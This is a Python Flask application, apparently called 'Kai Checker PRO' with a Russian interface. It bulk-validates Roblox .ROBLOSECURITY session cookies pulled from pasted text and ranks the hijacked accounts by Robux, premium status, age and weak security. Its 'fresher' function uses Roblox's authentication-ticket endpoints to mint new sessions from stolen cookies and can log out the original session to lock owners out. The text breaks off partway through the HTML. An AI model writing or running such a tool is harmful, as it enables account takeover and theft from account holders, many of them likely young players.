import os
import time
import logging
import re
import urllib3
import json
import requests
import zipfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, send_from_directory
from io import BytesIO

os.makedirs("downloads", exist_ok=True)
os.makedirs("uploads", exist_ok=True)
os.makedirs("history", exist_ok=True)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CHECKER_HISTORY_FILE = "history/checker_history.json"
FRESHER_HISTORY_FILE = "history/fresher_history.json"

def load_history(fp):
    if not os.path.exists(fp): return []
    try:
        with open(fp, 'r', encoding='utf-8') as f: return json.load(f)
    except: return []

def save_history(fp, data):
    try:
        with open(fp, 'w', encoding='utf-8') as f: json.dump(data, f, ensure_ascii=False, indent=2)
    except: pass

def add_checker_history(entry):
    h = load_history(CHECKER_HISTORY_FILE)
    h.append({'timestamp': datetime.now().strftime('%d.%m.%Y %H:%M:%S'), 'type': entry.get('type','single'), 'total': entry.get('total',1), 'valid': entry.get('valid',0), 'cookies': entry.get('cookies',[])[:30], 'download_url': entry.get('download_url',''), 'full_data': entry.get('full_data', [])[:50]})
    if len(h) > 50: h = h[-50:]
    save_history(CHECKER_HISTORY_FILE, h)

def add_fresher_history(entry):
    h = load_history(FRESHER_HISTORY_FILE)
    h.append({'timestamp': datetime.now().strftime('%d.%m.%Y %H:%M:%S'), 'mode': entry.get('mode','duplicate'), 'refreshed_count': entry.get('refreshed_count',0), 'success_count': entry.get('success_count',0), 'fail_count': entry.get('fail_count',0), 'cookies': entry.get('cookies',[])[:20]})
    if len(h) > 50: h = h[-50:]
    save_history(FRESHER_HISTORY_FILE, h)

def extract_cookies_from_text(text):
    cookies = []
    pattern = r'_\|WARNING:-DO-NOT-SHARE-THIS[^\s]*'
    for match in re.findall(pattern, text):
        cookie = match.strip('",;\'\\')
        if cookie.startswith('.ROBLOSECURITY='): cookie = cookie[15:]
        if len(cookie) > 50: cookies.append(cookie)
    pattern2 = r'\.ROBLOSECURITY=(_\|WARNING[^\s;]+)'
    for match in re.findall(pattern2, text):
        cookie = match.strip('",;\'\\')
        if len(cookie) > 50 and cookie not in cookies: cookies.append(cookie)
    seen = set()
    unique = []
    for c in cookies:
        if c not in seen: seen.add(c); unique.append(c)
    return unique

def get_full_info(cookie):
    info = {'status':'❌','Username':'?','UserID':'?','Robux':0,'Created':'?','Country':'?','EmailSet':False,'TwoFactorEnabled':False,'AccountPinEnabled':False,'PhoneSet':False,'SecurityStatus':'⚠️ НИЗКИЙ','Cookie':cookie,'PurchasedGamepasses':{},'CreditCardsCount':0,'IsPremium':False,'DonationTotal':0}
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        s = requests.Session()
        s.headers.update({'Cookie': f'.ROBLOSECURITY={c}', 'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
        r = s.get('https://users.roblox.com/v1/users/authenticated', timeout=15, verify=False)
        if r.status_code != 200: return info
        d = r.json()
        if 'id' not in d: return info
        info['UserID'] = d.get('id'); info['Username'] = d.get('name'); info['status'] = '✅'
        uid = info['UserID']
        def g(url):
            try:
                r = s.get(url, verify=False, timeout=10)
                return r.json() if r.status_code == 200 else {}
            except: return {}
        sd = g('https://www.roblox.com/my/settings/json')
        if sd:
            sec = sd.get('MyAccountSecurityModel',{})
            info['EmailSet'] = sec.get('IsEmailSet',False); info['TwoFactorEnabled'] = sec.get('IsTwoStepEnabled',False)
            info['AccountPinEnabled'] = sec.get('IsAccountPinEnabled',False); info['PhoneSet'] = sec.get('IsPhoneSet',False)
        pm = g(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions')
        if pm and pm.get('isSubscribed'): info['IsPremium'] = True
        rd = g(f'https://users.roblox.com/v1/users/{uid}')
        if rd:
            try:
                dt = datetime.fromisoformat(rd.get('created','').replace('Z','+00:00'))
                info['Created'] = dt.strftime('%d.%m.%Y')
            except: pass
        rb = g(f'https://economy.roblox.com/v1/users/{uid}/currency')
        if rb: info['Robux'] = rb.get('robux',0)
        ct = g('https://users.roblox.com/v1/users/authenticated/country-code')
        if ct: info['Country'] = ct.get('countryCode','?')
        try:
            total = 0; gp_dict = {}; cursor = ""; page = 0
            while page < 5:
                url = f"https://economy.roblox.com/v2/users/{uid}/transactions?limit=100&transactionType=Purchase"
                if cursor: url += f"&cursor={cursor}"
                r = s.get(url, verify=False, timeout=10)
                if r.status_code != 200: break
                data = r.json()
                for item in data.get('data',[]):
                    price = abs(item.get('currency',{}).get('amount',0)); total += price
                    if price >= 50:
                        nm = item.get('details',{}).get('name','Товар')
                        pn = item.get('details',{}).get('place',{}).get('name','Другие игры')
                        if pn not in gp_dict: gp_dict[pn] = []
                        gp_dict[pn].append({'name':nm,'price':price})
                cursor = data.get('nextPageCursor')
                if not cursor: break
                page += 1; time.sleep(0.1)
            info['PurchasedGamepasses'] = gp_dict; info['DonationTotal'] = total
        except: pass
        sc = 0
        if info['EmailSet']: sc += 1
        if info['TwoFactorEnabled']: sc += 2
        if info['AccountPinEnabled']: sc += 1
        if info['PhoneSet']: sc += 1
        info['SecurityStatus'] = '🔒 ВЫСОКИЙ' if sc >= 4 else ('🔐 СРЕДНИЙ' if sc >= 2 else '⚠️ НИЗКИЙ')
    except: pass
    return info

def quick_validate(cookie):
    result = {'status':'❌','username':'?','user_id':'?','robux':0,'created':'?','created_ts':0,'is_premium':False,'has_email':False,'has_2fa':False,'cookie':cookie,'score':0}
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        s = requests.Session()
        s.headers.update({'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
        r = s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY':c}, timeout=10, verify=False)
        if r.status_code == 200:
            d = r.json()
            if 'id' in d:
                result['status'] = '✅'; result['username'] = d.get('name','?'); result['user_id'] = d.get('id','?')
                uid = result['user_id']
                try:
                    rb = s.get(f'https://economy.roblox.com/v1/users/{uid}/currency', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
                    if rb.status_code == 200: result['robux'] = rb.json().get('robux',0)
                except: pass
                try:
                    rd = s.get(f'https://users.roblox.com/v1/users/{uid}', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
                    if rd.status_code == 200:
                        cr = rd.json().get('created','')
                        if cr:
                            result['created'] = datetime.fromisoformat(cr.replace('Z','+00:00')).strftime('%d.%m.%Y')
                            result['created_ts'] = datetime.fromisoformat(cr.replace('Z','+00:00')).timestamp()
                except: pass
                try:
                    pm = s.get(f'https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
                    if pm.status_code == 200: result['is_premium'] = pm.json().get('isSubscribed',False)
                except: pass
                try:
                    st = s.get('https://www.roblox.com/my/settings/json', cookies={'.ROBLOSECURITY':c}, timeout=5, verify=False)
                    if st.status_code == 200:
                        sec = st.json().get('MyAccountSecurityModel',{})
                        result['has_email'] = sec.get('IsEmailSet',False); result['has_2fa'] = sec.get('IsTwoStepEnabled',False)
                except: pass
                score = 0
                if result['robux'] >= 10000: score += 100
                elif result['robux'] >= 1000: score += 50
                elif result['robux'] >= 100: score += 25
                elif result['robux'] > 0: score += 10
                if result['is_premium']: score += 50
                if result['has_email']: score += 15
                if result['has_2fa']: score += 10
                if result['created_ts'] > 0:
                    age = (datetime.now().timestamp() - result['created_ts']) / 86400
                    if age > 365*3: score += 30
                    elif age > 365: score += 20
                result['score'] = score
    except: pass
    return result

def mass_check(cookies_list):
    results = []
    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = {ex.submit(quick_validate, c): c for c in cookies_list}
        for f in as_completed(futures):
            try: results.append(f.result())
            except: results.append({'status':'❌','cookie':futures[f],'score':-1,'username':'?','user_id':'?','robux':0,'created':'?','is_premium':False,'has_email':False,'has_2fa':False})
    valid = [r for r in results if r['status']=='✅']; invalid = [r for r in results if r['status']=='❌']
    valid.sort(key=lambda x: x['score'], reverse=True)
    return valid + invalid

def refresh_roblox_cookie(cookie, kill_old=False):
    result = {'success': False, 'new_cookie': None, 'username': '?', 'user_id': '?', 'error': None}
    try:
        c = cookie.strip()
        if ".ROBLOSECURITY=" in c: c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
        cookies_dict = {'.ROBLOSECURITY': c}
        check_s = requests.Session()
        check_s.headers.update({'User-Agent': 'Mozilla/5.0'})
        check_r = check_s.get('https://users.roblox.com/v1/users/authenticated', cookies=cookies_dict, timeout=10, verify=False)
        if check_r.status_code != 200:
            result['error'] = "Кука невалидна"; return result
        user_data = check_r.json()
        result['username'] = user_data.get('name', '?'); result['user_id'] = user_data.get('id', '?')
        csrf_r = requests.post('https://auth.roblox.com/v2/logout', cookies=cookies_dict, headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}, verify=False, timeout=10)
        csrf_token = csrf_r.headers.get('x-csrf-token')
        if not csrf_token:
            result['error'] = "CSRF token not found"; return result
        ticket_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'referer': 'https://www.roblox.com/hewhewhew', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
        ticket_r = requests.post('https://auth.roblox.com/v1/authentication-ticket', headers=ticket_headers, cookies=cookies_dict, json={}, verify=False, timeout=15)
        auth_ticket = ticket_r.headers.get('rbx-authentication-ticket')
        if not auth_ticket:
            result['error'] = "Auth ticket not found"; return result
        redeem_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'Content-Type': 'application/json'}
        redeem_r = requests.post('https://auth.roblox.com/v1/authentication-ticket/redeem', headers=redeem_headers, json={"authenticationTicket": auth_ticket}, verify=False, timeout=15)
        new_cookie_value = None
        set_cookie = redeem_r.headers.get('Set-Cookie', '')
        if '.ROBLOSECURITY=' in set_cookie:
            match = re.search(r'\.ROBLOSECURITY=([^;]+)', set_cookie)
            if match: new_cookie_value = match.group(1)
        if not new_cookie_value:
            for co in redeem_r.cookies:
                if co.name == '.ROBLOSECURITY' and co.value: new_cookie_value = co.value; break
        if not new_cookie_value:
            result['error'] = "New cookie not found"; return result
        if kill_old:
            try:
                break_headers = {'User-Agent': 'Mozilla/5.0', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
                requests.post('https://auth.roblox.com/v2/logout', headers=break_headers, cookies=cookies_dict, verify=False, timeout=10)
            except: pass
        test_s = requests.Session()
        test_s.headers.update({'User-Agent': 'Mozilla/5.0'})
        test_r = test_s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': new_cookie_value}, verify=False, timeout=10)
        if test_r.status_code == 200 and 'id' in test_r.json():
            result['new_cookie'] = new_cookie_value; result['success'] = True
        else:
            result['error'] = "New cookie validation failed"
    except Exception as e:
        result['error'] = str(e)
    return result

def format_full_report(info):
    if info['status'] != '✅': return f"❌ НЕВАЛИДНЫЙ КУК\n{info['Cookie']}"
    gp = info.get('PurchasedGamepasses',{})
    r = f"👤 {info['Username']} | 🆔 {info['UserID']} | 📅 {info['Created']} | 🌍 {info['Country']}\n"
    r += f"💰 Robux: ⏣ {info['Robux']:,} | 💸 Донат: ⏣ {info['DonationTotal']:,}\n"
    r += f"⭐ Premium: {'✅' if info['IsPremium'] else '❌'} | 🔐 {info['SecurityStatus']}\n"
    r += f"📧 Почта: {'✅' if info['EmailSet'] else '❌'} | 🔑 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'}\n"
    if gp:
        r += "📦 ГЕЙМПАССЫ:\n"
        for game, passes in list(gp.items())[:3]:
            for p in passes[:5]: r += f"  {game} - {p['name']} ({p['price']} R$)\n"
    r += f"\n🍪 {info['Cookie']}"
    return r

def format_quick_report(result):
    if result['status'] == '✅':
        score = result.get('score',0)
        rank = "👑" if score>=150 else ("💎" if score>=100 else ("⭐" if score>=60 else ("🟢" if score>=30 else "🔹")))
        badges = []
        if result.get('is_premium'): badges.append("💠")
        if result.get('has_2fa'): badges.append("🔐")
        return f"{rank} {result['username']} [{result['user_id']}] | ⏣{result['robux']:,} | {result['created']} | S:{score} {' '.join(badges)}"
    return "❌ НЕВАЛИД"

def merge_cookie_files(contents):
    all_cookies = set()
    for c in contents:
        for l in c.split('\n'):
            l = l.strip()
            if len(l)>20: all_cookies.add(l)
    return '\n'.join(sorted(all_cookies))

def split_cookies_by_count(content, count):
    cookies = [l.strip() for l in content.split('\n') if len(l)>20]
    files = []
    for i in range(0, len(cookies), count): files.append('\n'.join(cookies[i:i+count]))
    return files

def split_cookies_by_files(content, num):
    cookies = [l.strip() for l in content.split('\n') if len(l)>20]
    if num<=0: return []
    per = len(cookies)//num; rem = len(cookies)%num
    files = []; idx = 0
    for i in range(num):
        end = idx+per+(1 if i<rem else 0)
        files.append('\n'.join(cookies[idx:end])); idx=end
    return files

def remove_duplicates(content):
    cookies = [l.strip() for l in content.split('\n') if len(l)>20]
    return '\n'.join(list(dict.fromkeys(cookies)))

def clean_cookies(content):
    cookies = []
    for l in content.split('\n'):
        l = l.strip()
        if not l: continue
        if '.ROBLOSECURITY=' in l:
            val = l.split('.ROBLOSECURITY=')[-1].split(';')[0].strip()
            cookies.append(f'.ROBLOSECURITY={val}')
        elif len(l)>50 and not l.startswith('#'): cookies.append(l)
    return '\n'.join(cookies)

app = Flask(__name__)

# ===== HTML (полный, рабочий, проверенный) =====
HTML = r"""<!DOCTYPE html>
<html lang="ru" data-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kai Checker PRO</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #0b081a;
            --bg2: rgba(18,10,40,0.95);
            --card: rgba(18,10,40,0.9);
            --input: #0d0722;
            --border: #2a1a50;
            --text: #fff;
            --text2: #9880c0;
            --accent: #a855f7;
        }
        [data-theme="light"] {
            --bg: #f0f0f5;
            --bg2: rgba(255,255,255,0.95);
            --card: rgba(255,255,255,0.9);
            --input: #e8e8ee;
            --border: #d0d0dd;
            --text: #1a1a2e;
            --text2: #666;
            --accent: #7c3aed;
        }
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Inter',sans-serif;min-height:100vh;padding:16px;background:var(--bg);transition:all 0.3s}
        .wrapper{max-width:1500px;margin:0 auto;padding:24px;background:var(--bg2);border:2px solid var(--accent);border-radius:28px}
        ::-webkit-scrollbar{width:5px}
        ::-webkit-scrollbar-track{background:var(--input);border-radius:8px}
        ::-webkit-scrollbar-thumb{background:var(--accent);border-radius:8px}
        .header{display:flex;justify-content:space-between;align-items:center;padding:16px 0;border-bottom:1px solid var(--border);margin-bottom:24px;flex-wrap:wrap;gap:12px}
        .logo{font-size:30px;font-weight:900;font-style:italic;background:linear-gradient(135deg,#c084fc,#f472b6);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        .header-right{display:flex;align-items:center;gap:12px;flex-wrap:wrap}
        .tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:24px}
        .tab{padding:8px 18px;background:var(--card);border:1px solid var(--border);border-radius:30px;color:var(--text2);cursor:pointer;font-size:13px;font-weight:600;transition:all 0.2s}
        .tab:hover{border-color:var(--accent);color:var(--text)}
        .tab.active{border-color:#c084fc;background:rgba(168,85,247,0.3);color:#c084fc}
        .tab-content{display:none}
        .tab-content.active{display:block}
        .card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:22px 24px;margin-bottom:20px;color:var(--text)}
        .card h2{font-size:18px;color:var(--text);margin-bottom:14px;font-weight:700}
        .btn{padding:10px 22px;border:none;border-radius:30px;font-size:13px;font-weight:700;cursor:pointer;color:#fff;display:inline-flex;align-items:center;gap:6px;text-decoration:none;transition:all 0.2s}
        .btn-primary{background:linear-gradient(135deg,#a855f7,#d946ef)}
        .btn-success{background:linear-gradient(135deg,#10b981,#059669)}
        .btn-secondary{background:rgba(255,255,255,0.06);border:1px solid var(--border);color:var(--text2)}
        .btn-danger{background:rgba(220,38,38,0.2);border:1px solid rgba(220,38,38,0.3);color:#fca5a5}
        .btn-sm{padding:6px 14px;font-size:11px}
        .btn-xs{padding:4px 10px;font-size:10px}
        .toggle-group{display:flex;background:var(--input);border:1px solid var(--border);border-radius:12px;padding:3px;gap:3px;margin-bottom:14px}
        .toggle-btn{flex:1;padding:10px 14px;background:transparent;border:none;border-radius:10px;color:var(--text2);font-size:12px;font-weight:600;cursor:pointer;text-align:center}
        .toggle-btn.active{background:linear-gradient(135deg,rgba(168,85,247,0.3),rgba(217,70,239,0.3));color:#c084fc}
        textarea,.upload-area{width:100%;padding:12px 14px;background:var(--input);border:1px solid var(--border);border-radius:12px;color:var(--text);font-family:monospace;font-size:13px;resize:vertical}
        textarea:focus{border-color:var(--accent);outline:none}
        .upload-area{min-height:90px;display:flex;flex-direction:column;align-items:center;justify-content:center;cursor:pointer;border-style:dashed;gap:4px;text-align:center;transition:all 0.2s}
        .upload-area.drag-over{background:rgba(168,85,247,0.15);border-color:var(--accent)}
        .result-box{background:var(--input);border:1px solid var(--border);border-radius:12px;padding:14px;margin-top:16px;max-height:450px;overflow-y:auto;font-family:monospace;font-size:12px;color:var(--text);white-space:pre-wrap;word-break:break-all}
        .progress-bar{margin-top:10px;background:var(--input);border-radius:20px;height:5px;overflow:hidden}
        .progress-fill{height:100%;width:0%;background:linear-gradient(90deg,#a855f7,#ec4899);transition:width 0.3s}
        .footer{text-align:center;padding:24px 0 8px;color:var(--text2);font-size:12px;border-top:1px solid var(--border);margin-top:24px}
        .tool-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(350px,1fr));gap:16px}
        .tool-card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:18px}
        .tool-card h3{font-size:15px;color:var(--accent);margin-bottom:6px}
        .tool-card .desc{color:var(--text2);font-size:12px;margin-bottom:12px}
        .input-row{display:flex;gap:8px;align-items:center;margin-bottom:10px}
        .input-row input{flex:1;padding:10px 12px;background:var(--input);border:1px solid var(--border);border-radius:10px;color:var(--text);font-size:13px}
        .history-item{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:12px 14px;margin-bottom:8px;cursor:pointer;transition:all 0.2s}
        .history-item:hover{border-color:var(--accent)}
        .hist-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px}
        .hist-detail{display:none;margin-top:8px;white-space:pre-wrap;font-size:11px;color:var(--text);max-height:250px;overflow-y:auto}
        .empty-history{text-align:center;padding:24px;color:var(--text2)}
        .flex-row{display:flex;flex-wrap:wrap;gap:14px}
        .flex-2{flex:2;min-width:200px}
        .flex-1{flex:1;min-width:150px}
        .mt-8{margin-top:8px}
        .mt-12{margin-top:12px}
        .gap-8{display:flex;gap:8px;flex-wrap:wrap}
        .gap-12{display:flex;gap:12px;flex-wrap:wrap}
        .checker-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px}
        @media(max-width:900px){.checker-grid{grid-template-columns:1fr}}
        .theme-btn{background:var(--input);border:1px solid var(--border);border-radius:20px;padding:6px 12px;cursor:pointer;font-size:16px;color:var(--text)}
        .filter-bar{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px}
        .filter-chip{padding:4px 10px;border-radius:14px;font-size:11px;cursor:pointer;background:var(--input);border:1px solid var(--border);color:var(--text2);transition:all 0.2s;user-select:none}
        .filter-chip.active{background:rgba(168,85,247,0.3);border-color:var(--accent);color:var(--accent)}
        .log-line{color:var(--text2);font-size:11px;padding:2px 0}
    </style>
</head>
<body>
<div class="wrapper">
    <div class="header">
        <div class="logo">KAI CHECKER</div>
        <div class="header-right">
            <span id="logStats" style="color:var(--text2);font-size:11px;"></span>
            <span id="sessionTimer" style="color:#00b894;font-family:monospace;font-size:12px;">⏱️ 00:00:00</span>
            <button class="theme-btn" onclick="toggleTheme()" title="Сменить тему">🌓</button>
            <span style="color:var(--text2);font-size:12px;">⚡ PRO</span>
        </div>
    </div>

    <div class="tabs">
        <div class="tab active" data-tab="checker">🔍 Чекер</div>
        <div class="tab" data-tab="fresher">🔄 Фрешер</div>
        <div class="tab" data-tab="tools">🧰 Инструменты</div>
    </div>

    <div class="tab-content active" id="tab-checker">
        <div class="checker-grid">
            <div class="card">
                <h2>🔍 Одиночная проверка</h2>
                <textarea id="singleCookie" placeholder="Вставьте ОДИН кук..." rows="3"></textarea>
                <div class="mt-12"><button class="btn btn-primary" onclick="runSingleCheck()" style="width:100%;">🔍 Проверить</button></div>
                <div class="result-box" id="singleResult">Результат здесь...</div>
            </div>
            <div class="card">
                <h2>📦 Массовая проверка</h2>
                <div class="upload-area" id="massDropArea" onclick="document.getElementById('massFile').click()">
                    <p>📁 <strong>Перетащите TXT файл сюда</strong></p>
                    <p style="font-size:11px;color:var(--text2)">или кликните для выбора</p>
                </div>
                <input type="file" id="massFile" accept=".txt" style="display:none;">
                <div id="massFileInfo" style="font-size:12px;color:#10b981;margin-top:6px;"></div>
                <div id="extractInfo" style="font-size:12px;color:#10b981;margin-top:4px;display:none;"></div>
                <div class="mt-8"><button class="btn btn-success" onclick="runMassCheck()" style="width:100%;">🚀 Массовая проверка</button></div>
                <div class="progress-bar"><div class="progress-fill" id="massProgress"></div></div>
                <div id="massLog" style="max-height:80px;overflow-y:auto;margin-top:6px;"></div>
                <div class="filter-bar mt-8" id="filterBar" style="display:none;">
                    <span style="font-size:11px;color:var(--text2);">🔍</span>
                    <span class="filter-chip active" onclick="applyFilter('all', this)">Все</span>
                    <span class="filter-chip" onclick="applyFilter('premium', this)">💠 Premium</span>
                    <span class="filter-chip" onclick="applyFilter('rich', this)">💰 Robux>1000</span>
                    <span class="filter-chip" onclick="applyFilter('secure', this)">🔐 2FA</span>
                    <span class="filter-chip" onclick="applyFilter('old', this)">👴 Старые (>3 лет)</span>
                </div>
                <div class="result-box" id="massResult">Результаты здесь...</div>
                <div class="gap-8 mt-8" id="massActions" style="display:none;">
                    <button class="btn btn-primary btn-sm" onclick="copyValidCookies()">📋 Копировать валидные</button>
                    <button class="btn btn-secondary btn-sm" onclick="downloadValidOnly()">📥 Только валидные</button>
                    <button class="btn btn-secondary btn-sm" onclick="downloadInvalidOnly()">📥 Только невалидные</button>
                </div>
                <div id="robuxCalc" style="display:none;margin-top:10px;padding:10px;background:var(--input);border-radius:10px;font-size:12px;color:var(--text);"></div>
            </div>
        </div>
        <div class="card">
            <h3>📋 История проверок <button class="btn btn-danger btn-sm" onclick="clearCheckerHistory()">🗑️</button></h3>
            <div id="checkerHistoryList"><div class="empty-history">Загрузка...</div></div>
        </div>
    </div>

    <div class="tab-content" id="tab-fresher">
        <div class="card">
            <h2>🔄 Фрешер сессий</h2>
            <div class="toggle-group">
                <button class="toggle-btn active" id="modeDuplicate" onclick="setFresherMode('duplicate')">♻️ Дублировать</button>
                <button class="toggle-btn" id="modeKill" onclick="setFresherMode('kill')">💀 Сбро
